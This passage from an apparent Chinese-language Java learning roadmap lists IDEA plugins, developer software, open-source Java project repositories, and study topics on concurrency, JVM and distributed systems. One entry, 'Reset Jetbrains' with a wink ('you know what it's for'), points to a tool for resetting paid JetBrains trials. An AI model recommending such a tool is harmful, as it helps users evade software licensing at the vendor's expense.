href="https://plugins.jetbrains.com/plugin/93?pr=idea">https://plugins.jetbrains.com/plugin/93?pr=idea</a></li></ul></li></ul><h5 id="格式处理"><a href="#格式处理" class="headerlink" title="格式处理"></a>格式处理</h5><ul><li><p>CamelCase</p><ul><li>描述：快速字符串格式转换工具，如驼峰式</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/7160-camelcase">https://plugins.jetbrains.com/plugin/7160-camelcase</a></li></ul></li><li><p>Json Parser</p><ul><li>描述：验证和格式化 Json 字符串的工具</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/10650-json-parser">https://plugins.jetbrains.com/plugin/10650-json-parser</a></li></ul></li><li><p>Properties to YAML Converter</p><ul><li>描述：把 Properties 文件的格式转为 YAML 格式</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/8000-properties-to-yaml-converter">https://plugins.jetbrains.com/plugin/8000-properties-to-yaml-converter</a></li></ul></li><li><p>String Manipulation</p><ul><li>描述：字符串快捷处理</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/2162-string-manipulation">https://plugins.jetbrains.com/plugin/2162-string-manipulation</a></li></ul></li></ul><h5 id="代码统计"><a href="#代码统计" class="headerlink" title="代码统计"></a>代码统计</h5><ul><li>WakaTime<ul><li>描述：代码统计和跟踪插件</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/7425-wakatime">https://plugins.jetbrains.com/plugin/7425-wakatime</a></li></ul></li><li>Statistic<ul><li>描述：代码统计</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/4509-statistic">https://plugins.jetbrains.com/plugin/4509-statistic</a></li></ul></li></ul><h5 id="代码检索"><a href="#代码检索" class="headerlink" title="代码检索"></a>代码检索</h5><ul><li>OnlineSearch<ul><li>描述：选择文本后支持不同搜索引擎进行搜索</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/8298-onlinesearch/">https://plugins.jetbrains.com/plugin/8298-onlinesearch/</a></li></ul></li><li>CodeSearch<ul><li>描述：快捷地打开搜索引擎进行搜索</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/12578-codesearch">https://plugins.jetbrains.com/plugin/12578-codesearch</a></li></ul></li></ul><h5 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h5><ul><li><p>Leetcode Editor</p><ul><li>描述：在 IDEA 里刷算法题</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/12132-leetcode-editor">https://plugins.jetbrains.com/plugin/12132-leetcode-editor</a></li></ul></li><li><p>File Watchers</p><ul><li>描述：监听文件，当其发生变化时自动执行命令</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/7177-file-watchers">https://plugins.jetbrains.com/plugin/7177-file-watchers</a></li></ul></li><li><p>PlantUML integration</p><ul><li>描述：UML 建模工具，只需简单的代码就能画出复杂的 UML 类图</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/7017-plantuml-integration">https://plugins.jetbrains.com/plugin/7017-plantuml-integration</a></li></ul></li><li><p>Bytecode Editor</p><ul><li>描述：字节码编辑工具</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/8461-bytecode-editor">https://plugins.jetbrains.com/plugin/8461-bytecode-editor</a></li></ul></li><li><p>Alibaba Cloud Toolkit</p><ul><li>描述：阿里云工具集</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/11386-alibaba-cloud-toolkit">https://plugins.jetbrains.com/plugin/11386-alibaba-cloud-toolkit</a></li></ul></li><li><p>Tencent Cloud Toolkit</p><ul><li>描述：腾讯云工具集</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/15653-tencent-cloud-toolkit">https://plugins.jetbrains.com/plugin/15653-tencent-cloud-toolkit</a></li></ul></li><li><p>EduTools</p><ul><li>描述：面向教育者，允许创建、分享和加入练习</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/10081-edutools">https://plugins.jetbrains.com/plugin/10081-edutools</a></li></ul></li><li><p>IDE Features Trainer</p><ul><li>描述：IntelliJ IDEA 官方出的学习辅助插件</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/8554-ide-features-trainer">https://plugins.jetbrains.com/plugin/8554-ide-features-trainer</a></li></ul></li><li><p>JRebel Plugin</p><ul><li>描述：项目热更新，提高效率（可惜要收费）</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/4441-jrebel-and-xrebel-for-intellij">https://plugins.jetbrains.com/plugin/4441-jrebel-and-xrebel-for-intellij</a></li></ul></li><li><p>Key Promoter X</p><ul><li>描述：快捷键提示插件。当你执行鼠标操作时，如果该操作可被快捷键代替，会给出提示，帮助你自然形成使用快捷键的习惯，告别死记硬背。</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/9792-key-promoter-x/">https://plugins.jetbrains.com/plugin/9792-key-promoter-x/</a></li></ul></li><li><p>Translation</p><ul><li>描述：翻译插件，鼠标选中文本，点击右键即可自动翻译成多国语言。</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/8579-translation/">https://plugins.jetbrains.com/plugin/8579-translation/</a></li></ul></li><li><p>idea_seat</p><ul><li>描述：自动提醒，防止你久坐不动</li><li>官网：<a href="https://github.com/s-unscrupulous/idea_seat">https://github.com/s-unscrupulous/idea_seat</a></li></ul></li><li><p>RestfulTool</p><ul><li>描述：辅助 web 开发的工具集</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/14280-restfultool">https://plugins.jetbrains.com/plugin/14280-restfultool</a></li></ul></li><li><p>Multirun</p><ul><li>描述：同时启动多应用</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/7248-multirun">https://plugins.jetbrains.com/plugin/7248-multirun</a></li></ul></li></ul><h4 id="扩展增强类"><a href="#扩展增强类" class="headerlink" title="扩展增强类"></a>扩展增强类</h4><ul><li>Free Mybatis Plugin<ul><li>描述：MyBatis 增强插件，支持 mapper &#x3D;&gt; xml 的跳转、代码生成等功能</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/8321-free-mybatis-plugin">https://plugins.jetbrains.com/plugin/8321-free-mybatis-plugin</a></li></ul></li><li>MyBatis Log Plugin<ul><li>描述：MyBatis SQL 提取和格式化输出</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/10065-mybatis-log-plugin">https://plugins.jetbrains.com/plugin/10065-mybatis-log-plugin</a></li></ul></li><li>Maven Helper<ul><li>描述：Maven 辅助插件</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/7179-maven-helper">https://plugins.jetbrains.com/plugin/7179-maven-helper</a></li></ul></li><li>Gradle View<ul><li>描述：Gradle 项目管理工具的扩展</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/7150-gradle-view">https://plugins.jetbrains.com/plugin/7150-gradle-view</a></li></ul></li><li>Arthas Idea<ul><li>描述： Arthas 命令生成插件。Arthas 是阿里开源的 Java 在线诊断工具，该插件可以自动生成 Arthas 在线 Java 代码诊断命令，不用再到官网翻文档拼命令啦！</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/13581-arthas-idea/">https://plugins.jetbrains.com/plugin/13581-arthas-idea/</a></li></ul></li><li>GitToolBox<ul><li>描述： Git 增强插件。在自带的 Git 功能之上，新增了查看 Git 状态、自动拉取代码、提交通知等功能。最好用的是可以查看到每一行代码的最近一次提交信息。</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/7499-gittoolbox/">https://plugins.jetbrains.com/plugin/7499-gittoolbox/</a></li></ul></li><li>BashSupport<ul><li>描述：支持 Bash 脚本文件的高亮和提示等</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/4230-bashsupport">https://plugins.jetbrains.com/plugin/4230-bashsupport</a></li></ul></li><li>Git Flow Integration<ul><li>描述：Git Flow 的图形界面操作</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/7315-git-flow-integration">https://plugins.jetbrains.com/plugin/7315-git-flow-integration</a></li></ul></li><li>Gitee<ul><li>描述：开源中国的码云插件</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/8383-gitee">https://plugins.jetbrains.com/plugin/8383-gitee</a></li></ul></li><li>Drools<ul><li>描述：规则引擎的扩展</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/16871-drools">https://plugins.jetbrains.com/plugin/16871-drools</a></li></ul></li><li>EnvFile<ul><li>描述：对多环境配置文件的支持</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/7861-envfile">https://plugins.jetbrains.com/plugin/7861-envfile</a></li></ul></li><li>Kubernetes<ul><li>描述：容器管理的扩展</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/10485-kubernetes">https://plugins.jetbrains.com/plugin/10485-kubernetes</a></li></ul></li><li>Vue.js<ul><li>描述：Vue.js 前端框架的扩展</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/9442-vue-js">https://plugins.jetbrains.com/plugin/9442-vue-js</a></li></ul></li><li>Scala<ul><li>描述：Scala 语言的扩展</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/1347-scala">https://plugins.jetbrains.com/plugin/1347-scala</a></li></ul></li><li>Zookeeper<ul><li>描述：Zookeeper 中间件的扩展</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/7364-zookeeper">https://plugins.jetbrains.com/plugin/7364-zookeeper</a></li></ul></li><li>Jms messenger<ul><li>描述：对 Java 消息服务的扩展</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/10949-jms-messenger">https://plugins.jetbrains.com/plugin/10949-jms-messenger</a></li></ul></li><li>MapStruct Support<ul><li>描述：对 MapStruct 对象转换的支持</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/10036-mapstruct-support">https://plugins.jetbrains.com/plugin/10036-mapstruct-support</a></li></ul></li><li>Big Data Tools<ul><li>描述：提供了 HDFS 等大数据框架的工具集</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/12494-big-data-tools">https://plugins.jetbrains.com/plugin/12494-big-data-tools</a></li></ul></li><li>CSV<ul><li>描述：支持 CSV 文件的高亮和提示等</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/10037-csv">https://plugins.jetbrains.com/plugin/10037-csv</a></li></ul></li><li>Ideolog<ul><li>描述：识别和格式化 log 日志文件</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/9746-ideolog">https://plugins.jetbrains.com/plugin/9746-ideolog</a></li></ul></li><li>Toml<ul><li>描述：支持 toml 文件的高亮和提示等</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/8195-toml">https://plugins.jetbrains.com/plugin/8195-toml</a></li></ul></li><li>.env files support<ul><li>描述：支持 .env 文件的高亮和提示等</li><li>官网：<a href="https://plugins.jetbrains.com/plugin/9525--env-files-support">https://plugins.jetbrains.com/plugin/9525--env-files-support</a></li></ul></li></ul><h3 id="常用软件"><a href="#常用软件" class="headerlink" title="常用软件"></a>常用软件</h3><p><strong>以下部分软件可在【公众号：程序员鱼皮】回复【软件】获取~</strong></p><h5 id="开发相关"><a href="#开发相关" class="headerlink" title="开发相关"></a>开发相关</h5><ul><li>JetBrains IDEA：Java 集成开发环境，凭学生邮箱可申请免费使用（<a href="https://www.jetbrains.com/idea/%EF%BC%89">https://www.jetbrains.com/idea/）</a></li><li>Reset Jetbrains：你懂的</li><li>Visual Studio Code：插件化代码编辑器（<a href="https://code.visualstudio.com/%EF%BC%89">https://code.visualstudio.com/）</a></li><li>Sublime Text：轻量代码编辑器（<a href="https://www.sublimetext.com/%EF%BC%89">https://www.sublimetext.com/）</a></li><li>Navicat：数据库管理软件（<a href="https://www.navicat.com.cn/%EF%BC%89">https://www.navicat.com.cn/）</a></li><li>JMeter：Java 性能测试工具（<a href="https://jmeter.apache.org/%EF%BC%89">https://jmeter.apache.org/）</a></li><li>JVisual VM：Java 运行状态可视化工具（<a href="https://visualvm.github.io/%EF%BC%89">https://visualvm.github.io/）</a></li><li>XShell：SSH 连接软件（<a href="https://www.netsarang.com/zh/xshell/%EF%BC%89">https://www.netsarang.com/zh/xshell/）</a></li><li>XFtp：FTP 连接软件（<a href="https://www.netsarang.com/zh/xftp/%EF%BC%89">https://www.netsarang.com/zh/xftp/）</a></li><li>Redis Desktop Manager：Redis 可视化管理工具（<a href="https://github.com/uglide/RedisDesktopManager%EF%BC%89">https://github.com/uglide/RedisDesktopManager）</a></li><li>Postman：接口测试工具（<a href="https://www.postman.com/%EF%BC%89">https://www.postman.com/）</a></li><li>VMware：虚拟机软件（<a href="https://www.vmware.com/%EF%BC%89">https://www.vmware.com/）</a></li><li>Chocolatey：Windows 软件包管理器（<a href="https://chocolatey.org/%EF%BC%89">https://chocolatey.org/）</a></li><li>Typora：写文档软件（<a href="https://typora.io/%EF%BC%89">https://typora.io/）</a></li></ul><h5 id="效率"><a href="#效率" class="headerlink" title="效率"></a>效率</h5><ul><li>Ditto：强大的剪切板（<a href="https://ditto-cp.sourceforge.io/%EF%BC%89">https://ditto-cp.sourceforge.io/）</a></li><li>uTools：插件化的效率工具（<a href="https://u.tools/%EF%BC%89">https://u.tools/）</a></li><li>XMind：思维导图软件（<a href="https://www.xmind.cn/%EF%BC%89">https://www.xmind.cn/）</a></li><li>Qdir：Windows 多窗口管理器（<a href="https://q-dir.en.softonic.com/%EF%BC%89">https://q-dir.en.softonic.com/）</a></li></ul><h3 id="项目源码（50-套）"><a href="#项目源码（50-套）" class="headerlink" title="项目源码（50 套）"></a>项目源码（50 套）</h3><h4 id="电商秒杀"><a href="#电商秒杀" class="headerlink" title="电商秒杀"></a>电商秒杀</h4><ul><li><p>天猫整站 J2EE：<a href="https://how2j.cn/module/115.htm">https://how2j.cn/module/115.htm</a></p></li><li><p>天猫整站 SSM：<a href="https://how2j.cn/module/134.html">https://how2j.cn/module/134.html</a></p></li><li><p>天猫整站 Springboot：<a href="https://how2j.cn/module/156.html">https://how2j.cn/module/156.html</a></p></li><li><p>mall-learning：<a href="https://github.com/macrozheng/mall-learningmall">https://github.com/macrozheng/mall-learningmall</a> （学习教程，架构、业务、技术要点全方位解析）</p></li><li><p>SpringBoot 电商商城系统 Mall4j：<a href="https://github.com/gz-yami/mall4j">https://github.com/gz-yami/mall4j</a></p></li><li><p>SpringBoot 完整电商系统 Mall：<a href="https://github.com/macrozheng/mall">https://github.com/macrozheng/mall</a> （包括前台商城系统及后台管理系统，基于 SpringBoot+MyBatis 实现）</p></li><li><p>newbee-mall：<a href="https://github.com/newbee-ltd/newbee-mall">https://github.com/newbee-ltd/newbee-mall</a> （一套电商系统，包括 newbee-mall 商城系统及 newbee-mall-admin 商城后台管理系统，基于 Spring Boot 2.X 及相关技术栈开发）</p></li><li><p>paascloud-master：<a href="https://github.com/paascloud/paascloud-master">https://github.com/paascloud/paascloud-master</a> （基于 spring cloud + vue + oAuth2.0，前后端分离商城系统）</p></li><li><p>mall-swarm：<a href="https://github.com/macrozheng/mall-swarm">https://github.com/macrozheng/mall-swarm</a> （一套微服务商城系统，采用了 Spring Cloud Greenwich、Spring Boot 2、MyBatis、Docker、Elasticsearch 等核心技术，同时提供了基于 Vue 的管理后台方便快速搭建系统）</p></li><li><p>onemall：<a href="https://github.com/YunaiV/onemall">https://github.com/YunaiV/onemall</a> （mall 商城，基于微服务的思想，构建在 B2C 电商场景下的项目实战。核心技术栈，是 Spring Boot + Dubbo 。未来，会重构成 Spring Cloud Alibaba）</p></li><li><p>litemall：<a href="https://github.com/linlinjava/litemall">https://github.com/linlinjava/litemall</a> （又一个小商城，litemall &#x3D; Spring Boot 后端 + Vue 管理员前端 + 微信小程序用户前端 + Vue 用户移动端）</p></li><li><p>xmall：<a href="https://github.com/Exrick/xmall">https://github.com/Exrick/xmall</a> （基于SOA架构的分布式电商购物商城 前后端分离 前台商城:Vue全家桶 后台管理系统）</p></li><li><p>miaosha：<a href="https://github.com/qiurunze123/miaosha">https://github.com/qiurunze123/miaosha</a> （秒杀系统设计与实现）</p></li><li><p>SecKill：<a href="https://github.com/hfbin/Seckill">https://github.com/hfbin/Seckill</a> （基于 SpringBoot+Mybatis+Redis+RabbitMQ 秒杀系统）</p></li></ul><h4 id="博客论坛"><a href="#博客论坛" class="headerlink" title="博客论坛"></a>博客论坛</h4><ul><li><p><a href="https://github.com/langhsu/mblog">Mblog</a>：开源 Java 博客系统</p></li><li><p><a href="https://github.com/halo-dev/halo">halo</a>：一个优秀的开源博客发布应用</p></li><li><p><a href="https://github.com/Qbian61/forum-java">forum-java</a>：一款用 Java（spring boot） 实现的现代化社区（论坛&#x2F;问答&#x2F;BBS&#x2F;社交网络&#x2F;博客）系统平台</p></li><li><p><a href="https://github.com/lenve/vhr">vhr</a>：微人事是一个前后端分离的人力资源管理系统，项目采用 SpringBoot+Vue 开发。</p></li><li><p><a href="https://github.com/cloudfavorites/favorites-web">favorites-web</a>:云收藏 Spring Boot 2.X 开源项目。云收藏是一个使用 Spring Boot 构建的开源网站，可以让用户在线随时随地收藏的一个网站，在网站上分类整理收藏的网站或者文章。</p></li><li><p><a href="https://github.com/codedrinker/community">community</a>：码问，开源论坛、问答系统，现有功能提问、回复、通知、最新、最热、消除零回复功能。技术栈 Spring、Spring Boot、MyBatis、MySQL&#x2F;H2、Bootstrap</p></li><li><p><a href="https://github.com/yourkevin/NiterForum">NiterForum</a>：尼特社区-NiterForum-一个论坛&#x2F;社区程序。后端Springboot&#x2F;MyBatis&#x2F;Maven&#x2F;MySQL，前端Thymeleaf&#x2F;Layui。可供初学者，学习、交流使用。</p></li><li><p><a href="https://github.com/lenve/VBlog">VBlog</a>：V部落，Vue+SpringBoot实现的多用户博客管理平台!</p></li><li><p><a href="https://github.com/damoqiongqiu/NiceFish">NiceFish</a>：SpringBoot&#x2F;SpringCloud 前后端分离项目</p></li><li><p><a href="https://github.com/ZHENFENG13/My-Blog">My-Blog</a>： My Blog 是由 SpringBoot + Mybatis + Thymeleaf 等技术实现的 Java 博客系统，页面美观、功能齐全、部署简单及完善的代码，一定会给使用者无与伦比的体验。</p></li><li><p><a href="https://github.com/ZHENFENG13/My-Blog-layui">My-Blog-layui</a>：layui 版本的 My-Blog : A simple &amp; beautiful blogging system implemented with spring-boot &amp; layui &amp; thymeleaf &amp; mybatis My Blog 是由  SpringBoot + Layui + Mybatis + Thymeleaf 等技术实现的 Java  博客系统，页面美观、功能齐全、部署简单及完善的代码，一定会给使用者无与伦比的体验</p></li><li><p><a href="https://github.com/88250/symphony">symphony</a>：Java 实现的现代化社区</p></li></ul><h4 id="管理系统"><a href="#管理系统" class="headerlink" title="管理系统"></a>管理系统</h4><ul><li><p><a href="https://github.com/wxiaoqi/Spring-Cloud-Admin">Spring-Cloud-Admin</a>：Cloud-Admin 是国内首个基于 Spring Cloud 微服务化开发平台，具有统一授权、认证后台管理系统，其中包含具备用户管理、资源权限管理、网关 API 管理等多个模块，支持多业务系统并行开发，可以作为后端服务的开发脚手架。代码简洁，架构清晰，适合学习和直接项目中使用。核心技术采用 Spring Boot2 以及 Spring Cloud Gateway 相关核心组件，前端采用 vue-element-admin 组件。</p></li><li><p><a href="https://github.com/tomsun28/bootshiro">bootshiro</a>：基于 springboot+shiro+jwt 的资源无状态认证权限管理系统后端</p></li><li><p><a href="https://github.com/72crm/72crm-java">悟空CRM</a>：基于jfinal+vue+ElementUI的前后端分离CRM系统</p></li><li><p><a href="https://github.com/elunez/eladmin">EL-ADMIN</a>：基于 SpringBoot 的后台管理系统</p></li><li><p><a href="https://gitee.com/log4j/pig">pig</a>：基于 Spring Boot 2.2、 Spring Cloud Hoxton &amp; Alibaba、 OAuth2 的 RBAC 权限管理系统。</p></li><li><p><a href="https://github.com/wuyouzhuguli/FEBS-Shiro">FEBS-Shiro</a>：Spring Boot 2.1.3，Shiro1.4.0 &amp; Layui 2.5.4 权限管理系统。</p></li><li><p><a href="https://github.com/Heeexy/SpringBoot-Shiro-Vue">Spring Boot-Shiro-Vue</a>：基于Spring Boot-Shiro-Vue 的权限管理</p></li><li><p><a href="https://github.com/ZeroWdd/studentmanager">studentmanager</a>：基于springboot+mybatis学生管理系统</p></li><li><p><a href="https://github.com/jishenghua/jshERP">jshERP</a>：华夏ERP基于SpringBoot框架和SaaS模式，立志为中小企业提供开源好用的ERP软件，目前专注进销存+财务功能。主要模块有零售管理、采购管理、销售管理、仓库管理、财务管理、报表查询、系统管理等。支持预付款、收入支出、仓库调拨、组装拆卸、订单等特色功能。拥有库存状况、出入库统计等报表。同时对角色和权限进行了细致全面控制，精确到每个按钮和菜单。</p></li><li><p><a href="https://github.com/misterchaos/HotelSystem">HotelSystem</a>：酒店管理系统 Java,tomcat,mysql,servlet,jsp实现，没有使用任何框架</p></li></ul><h4 id="开发平台"><a href="#开发平台" class="headerlink" title="开发平台"></a>开发平台</h4><ul><li><a href="https://github.com/2014shijina2014/open-capacity-platform">open-capacity-platform</a>：微服务能力开发平台</li><li><a href="https://github.com/zhangdaiscott/jeecg-boot">jeecg-boot</a>：JeecgBoot是一款基于BPM的低代码平台！前后端分离架构 SpringBoot 2.x，SpringCloud，Ant  Design&amp;Vue，Mybatis-plus，Shiro，JWT，支持微服务。强大的代码生成器让前后端代码一键生成，实现低代码开发！</li></ul><h4 id="其他-2"><a href="#其他-2" class="headerlink" title="其他"></a>其他</h4><ul><li><p><a href="https://github.com/mindskip/xzs">学之思在线考试系统</a>：一款 java + vue 的前后端分离的考试系统</p></li><li><p><a href="https://github.com/Jackson0714/PassJava-Platform">PassJava-Platform</a>：一款面试刷题的 Spring Cloud 开源系统</p></li><li><p><a href="https://github.com/kekingcn/kkFileView">kkFileView</a>：使用spring boot打造文件文档在线预览项目</p></li><li><p><a href="https://github.com/baomidou/dynamic-datasource-spring-boot-starter">dynamic-datasource</a>：一个基于springboot的快速集成多数据源的启动器</p></li><li><p><a href="https://github.com/373675032/moti-cloud">moti-cloud</a>：莫提网盘，基于 SpringBoot+MyBatis+ThymeLeaf+BootStrap，适合初学者</p></li><li><p><a href="https://github.com/qiurunze123/threadandjuc">threadandjuc</a>：three-high-import 高可用\高可靠\高性能，三高多线程导入系统（该项目意义为理论贯通)</p></li><li><p><a href="https://github.com/proxyee-down-org/proxyee-down">proxyee-down</a>：http下载工具，基于http代理，支持多连接分块下载</p></li><li><p><a href="https://github.com/sfturing/hosp_order">hosp_order</a>：医院预约挂号系统，基于 SSM 框架</p></li><li><p><a href="https://how2j.cn/module/170.html">趋势投资 SpringCloud</a></p></li><li><p><a href="https://how2j.cn/module/176.html">DiyTomcat</a></p></li></ul><h2 id="阶段-6：Java-高级"><a href="#阶段-6：Java-高级" class="headerlink" title="阶段 6：Java 高级"></a>阶段 6：Java 高级</h2><h3 id="目标-5"><a href="#目标-5" class="headerlink" title="目标"></a>目标</h3><p>不满足于能做，而是通过更 <strong>深入</strong> 和 <strong>广泛</strong> 的学习，实现高质量的代码和更优秀的架构，培养解决问题的能力。</p><p>已经到了这个阶段，建议除了看完成的教程外，平时多自主搜索信息去学习，积少成多。比如遇到了一个不了解的名词，可以去网上搜一下，感兴趣的话再进行下一步的学习。</p><h3 id="🌖-并发编程（21-天）"><a href="#🌖-并发编程（21-天）" class="headerlink" title="🌖 并发编程（21 天）"></a>🌖 并发编程（21 天）</h3><p>对 Java 后端开发程序员来说，懂得如何利用有限的系统资源来提高系统的性能是很重要的，也是大厂面试考察的重点，因此并发编程（尤其是 Java 并发包的使用）这块的知识很重要。</p><p>把它放到高级，是因为在学并发编程前，需要有一定的编程经验、了解一定的操作系统知识。</p><h4 id="知识-21"><a href="#知识-21" class="headerlink" title="知识"></a>知识</h4><ul><li>线程和进程</li><li>线程状态</li><li>并行和并发</li><li>同步和异步</li><li>Synchronized</li><li>Volatile 关键字</li><li>Lock 锁</li><li>死锁</li><li>可重入锁</li><li>线程安全</li><li>线程池</li><li>JUC 的使用</li><li>AQS</li><li>Fork Join</li><li>CAS</li></ul><h4 id="学习建议-23"><a href="#学习建议-23" class="headerlink" title="学习建议"></a>学习建议</h4><p>并发编程入门不难，依然是 <strong>先学会使用</strong> 基础的 Java 并发包， 再通过大量地实践和测试，了解一些原理，才能真正掌握何时使用、如何更合理地使用并发编程。而不是张口闭口多线程，上天入地高并发。</p><h4 id="经典面试题-16"><a href="#经典面试题-16" class="headerlink" title="经典面试题"></a>经典面试题</h4><ol><li>volatile 关键字的作用</li><li>使用线程池有哪些好处？</li><li>线程池参数如何设置？</li><li>什么是线程安全问题，如何解决？</li><li>介绍 synchronized 的锁升级机制</li><li>CopyOnWriteArrayList 适用于哪种场景？</li></ol><h4 id="资源-22"><a href="#资源-22" class="headerlink" title="资源"></a>资源</h4><ul><li><p>视频</p><ul><li>⭐【尚硅谷】大厂必备技术之JUC并发编程2021最新版：<a href="https://www.bilibili.com/video/BV1Kw411Z7dF">https://www.bilibili.com/video/BV1Kw411Z7dF</a> （特点是短、精、新）</li><li>黑马程序员全面深入学习Java并发编程：<a href="https://www.bilibili.com/video/BV16J411h7Rd">https://www.bilibili.com/video/BV16J411h7Rd</a> （讲的很细、全面深入）</li></ul></li><li><p>书籍</p><ul><li>⭐《Java并发编程实战》（国外的经典）</li><li>⭐《Java 并发编程艺术》（国人写的，理论思想内容较多，有时间建议反复看）</li></ul></li><li><p>项目</p><ul><li>⭐ Java 并发知识点总结：<a href="https://github.com/CL0610/Java-concurrency">https://github.com/CL0610/Java-concurrency</a></li></ul></li></ul><h3 id="🌖-JVM（30-天）"><a href="#🌖-JVM（30-天）" class="headerlink" title="🌖 JVM（30 天）"></a>🌖 JVM（30 天）</h3><p>想要深入理解 Java，探秘 Java 跨平台的奥秘，一定要了解 Java 底层的虚拟机技术。</p><p>了解虚拟机、掌握虚拟机性能调优方法，有助于你写出更高性能、资源占用更小的优质程序。</p><p>在学习 JVM 的过程中，也能学到很多精妙的设计，开拓思路。</p><h4 id="知识-22"><a href="#知识-22" class="headerlink" title="知识"></a>知识</h4><ul><li>JVM 内存结构</li><li>JVM 生命周期</li><li>主流虚拟机</li><li>Java 代码执行流程</li><li>类加载<ul><li>类加载器</li><li>类加载过程</li><li>双亲委派机制</li></ul></li><li>垃圾回收<ul><li>垃圾回收器</li><li>垃圾回收策略</li><li>垃圾回收算法</li><li>StopTheWorld</li></ul></li><li>字节码</li><li>内存分配和回收</li><li>JVM 性能调优<ul><li>性能分析方法</li><li>常用工具</li><li>参数设置</li></ul></li><li>Java 探针</li><li>线上故障分析</li></ul><h4 id="学习建议-24"><a href="#学习建议-24" class="headerlink" title="学习建议"></a>学习建议</h4><p>JVM 的知识略显枯燥，建议先看视频，有实操的地方一定要实操！自己多去分析。</p><p>第一遍不理解没有关系，可以再看书来巩固，想要真正学好，《深入理解 Java 虚拟机（第三版）》一定要读。</p><p>如果只是为了通过面试可以直接看更精简的视频，比如狂神的。</p><h4 id="经典面试题-17"><a href="#经典面试题-17" class="headerlink" title="经典面试题"></a>经典面试题</h4><ol><li>介绍 JVM 的内存模型？</li><li>JVM 内存为什么要分代？</li><li>介绍一次完整的 GC 流程</li><li>介绍双亲委派模型，为什么需要它？</li></ol><h4 id="资源-23"><a href="#资源-23" class="headerlink" title="资源"></a>资源</h4><ul><li>视频<ul><li>⭐ 尚硅谷宋红康 - JVM 全套教程详解：<a href="https://www.bilibili.com/video/BV1PJ411n7xZ">https://www.bilibili.com/video/BV1PJ411n7xZ</a> （讲得相当全面！附有实操）</li><li>【狂神说Java】JVM快速入门篇：<a href="https://www.bilibili.com/video/BV1iJ411d7jS">https://www.bilibili.com/video/BV1iJ411d7jS</a> （讲得有点浅，但都是面试重点，时间紧的小伙伴可以直接看这个）</li></ul></li><li>书籍<ul><li>⭐《深入理解 Java 虚拟机（第三版）》（有理论有实践，内容丰富，不可多得的 JVM 学习神书，就是有点废头发）</li></ul></li><li>项目<ul><li>⭐ Java 虚拟机底层原理知识总结：<a href="https://github.com/doocs/jvm">https://github.com/doocs/jvm</a></li></ul></li><li>实战<ul><li>阿里云 JVM 实战：<a href="https://developer.aliyun.com/graph/java/point/64">https://developer.aliyun.com/graph/java/point/64</a></li></ul></li><li>工具<ul><li>Arthas 开源 Java 诊断工具：<a href="https://github.com/alibaba/arthas">https://github.com/alibaba/arthas</a></li></ul></li></ul><h3 id="架构设计"><a href="#架构设计" class="headerlink" title="架构设计"></a>架构设计</h3><h4 id="🌖-分布式"><a href="#🌖-分布式" class="headerlink" title="🌖 分布式"></a>🌖 分布式</h4><ul><li>分布式理论<ul><li>CAP</li><li>BASE</li></ul></li><li>分布式缓存<ul><li>Redis</li><li>Memcached</li><li>Etcd</li></ul></li><li>一致性算法<ul><li>Raft</li><li>Paxos</li><li>一致性哈希</li></ul></li><li>分布式事务<ul><li>解决方案<ul><li>2PC</li><li>3PC</li><li>TCC</li><li>本地消息表</li><li>MQ 事务消息</li><li>最大努力通知</li></ul></li><li>LCN 分布式事务框架：<a href="https://github.com/codingapi/tx-lcn">https://github.com/codingapi/tx-lcn</a></li></ul></li><li>分布式 id 生成<ul><li>Leaf 分布式 id 生成服务：<a href="https://github.com/Meituan-Dianping/Leaf">https://github.com/Meituan-Dianping/Leaf</a></li></ul></li><li>分布式任务调度<ul><li>XXL-JOB 调度平台：<a href="https://www.xuxueli.com/xxl-job/">https://www.xuxueli.com/xxl-job/</a></li><li>elastic-job：<a href="https://gitee.com/elasticjob/elastic-job">https://gitee.com/elasticjob/elastic-job</a></li></ul></li><li>分布式服务调用<ul><li>trpc</li></ul></li><li>分布式存储<ul><li>HDFS</li><li>Ceph</li></ul></li><li>分布式数据库<ul><li>TiDB</li><li>OceanBase</li></ul></li><li>分布式文件系统<ul><li>HDFS</li></ul></li><li>分布式协调<ul><li>Zookeeper</li></ul></li><li>分布式监控<ul><li>Prometheus</li><li>Zabbix</li></ul></li><li>分布式消息队列<ul><li>RabbitMQ</li><li>Kafka</li><li>Apache Pulsar</li></ul></li><li>分布式日志收集<ul><li>Elastic 